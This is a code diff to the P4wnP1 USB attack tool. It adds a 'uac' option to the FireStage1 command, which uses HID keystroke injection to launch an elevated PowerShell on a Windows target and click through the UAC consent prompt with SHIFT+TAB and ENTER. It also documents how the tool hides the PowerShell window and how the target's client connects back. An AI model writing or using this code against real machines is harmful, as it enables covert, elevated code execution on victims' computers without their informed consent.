@@ -370,7 +370,7 @@ Use "help FireStage1" to get more details.
 	def killCLient(self):
 		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
 	
-	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000,  hideTargetWindow = True):
+	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000,  hideTargetWindow = True,  bypassUAC = False):
 		'''
 		Triggers Stage 1 either with pure PowerShell using reflections (trigger_type = 1)
 		or with PowerShell invoking a .NET assembly, running stage1 (trigger_type = 2)
@@ -395,6 +395,20 @@ Use "help FireStage1" to get more details.
 	                ENTER
 	        '''		
 		ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
+		
+		if bypassUAC:
+			# confirm UAC dialog with "SHIFT+TAB, ENTER" to be language independent (no "ALT+Y")
+			ps_stub += '''
+				STRING start powershell -verb runas;exit
+				ENTER
+				DELAY 500
+
+				SHIFT TAB
+				DELAY 100
+				ENTER
+		'''
+			# use trigger delay once more
+			ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
 		
 		ps_script = ""
 		
@@ -626,7 +640,7 @@ Use "help FireStage1" to get more details.
 	
 	def do_FireStage1(self, line):
 		'''
-	usage: FireStage1 <trigger_type> <trigger_delay in milliseconds>
+	usage: FireStage1 <trigger_type> <trigger_delay in milliseconds> [nohide] [uac]
 	
 	Fires stage 1 via HID keyboard against a PowerShell process
 	on a Windows client.
@@ -664,7 +678,20 @@ Use "help FireStage1" to get more details.
 	  The latter case could be handled by increasing the trigger delay,
 	  to give the target host more time between start of powershell
 	  nd start of typing out stage1.
-	  The value defaults to 1000 ms if omitted.'''
+	  The value defaults to 1000 ms if omitted.
+	  
+	nohide
+	  If "nohide" is added, the stup hiding the powershell window on
+	  the target is omited
+	  
+	uac
+	  If "uac" is added P4wnP1 tries to run an elevated PowerShell
+	  session homing the payload.
+	  
+	  Caution: The target user has to be member of the "Local
+	  Administrators" group, otherwise this would fail.
+	  The option is disabled by default.
+	  '''
 		
 		arg_error="Wrong arguments given"
 		trigger_type = 1
@@ -686,8 +713,12 @@ Use "help FireStage1" to get more details.
 		if "nohide" in line.lower():
 			hideTargetWindow = False
 			
+		bypassUAC = False
+		if "uac" in line.lower():
+			bypassUAC = True		
+			
 		print "Starting to type out stage1 to the target..."
-		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms, hideTargetWindow = hideTargetWindow)	
+		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms, hideTargetWindow = hideTargetWindow, bypassUAC=bypassUAC)
 		print "...done. If the client doesn't connect back, check the target"
 		print "keyboard layout with 'SetKeyboardLanguage'"
 		
